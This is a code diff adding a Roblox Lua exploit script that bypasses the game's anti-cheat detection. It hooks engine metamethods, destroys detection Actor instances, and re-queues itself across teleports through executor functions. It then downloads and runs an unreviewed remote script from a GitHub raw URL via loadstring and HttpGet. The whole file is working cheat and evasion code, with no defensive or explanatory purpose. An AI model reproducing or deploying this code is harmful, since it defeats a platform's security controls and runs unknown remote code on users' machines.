@@ -1,0 +1,63 @@
+-- INITIALIZATION
+local bypassScript = [[
+	-- variables
+	local runService = game:GetService("RunService");
+	local replicatedFirst = game:GetService("ReplicatedFirst");
+	local insertService = game:GetService("InsertService");
+
+	-- detection bypass
+	insertService.DescendantAdded:Connect(function(instance)
+		if instance:IsA("Actor") then
+			instance:Destroy()
+		end
+	end);
+	
+	-- actor bypass
+	replicatedFirst.ChildAdded:Connect(function(instance)
+		if instance:IsA("Actor") then
+			replicatedFirst.ChildAdded:Wait();
+			for _, child in next, instance:GetChildren() do
+				child.Parent = replicatedFirst;
+			end
+		end
+	end);
+	
+	-- connect parallel bypass
+	local old;
+	old = hookmetamethod(runService.Stepped, "__index", function(self, index)
+		local indexed = old(self, index);
+		if index == "ConnectParallel" and not checkcaller() then
+			hookfunction(indexed, newcclosure(function(signal, callback)
+				return old(self, "Connect")(signal, function()
+					return self:Wait() and callback();
+				end);
+			end));
+		end
+		return indexed;
+	end);
+	
+	-- module destroy bypass
+	task.spawn(function()
+		local shared = getrenv().shared;
+
+		repeat task.wait() until shared.close;
+
+		getgenv().shared.RequireTable = shared.require
+	end);
+	
+	print("IT FUCKING WORKED")
+    wait(5)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/incrimination/scr/main/y.lua", true))()
+]]
+
+local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
+if queueteleport then
+	print("queuetp module found")
+end
+
+if shared.RequireTable == nil then
+	if queueteleport then
+		queueteleport(bypassScript)
+		game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, lplr)
+	end
+end
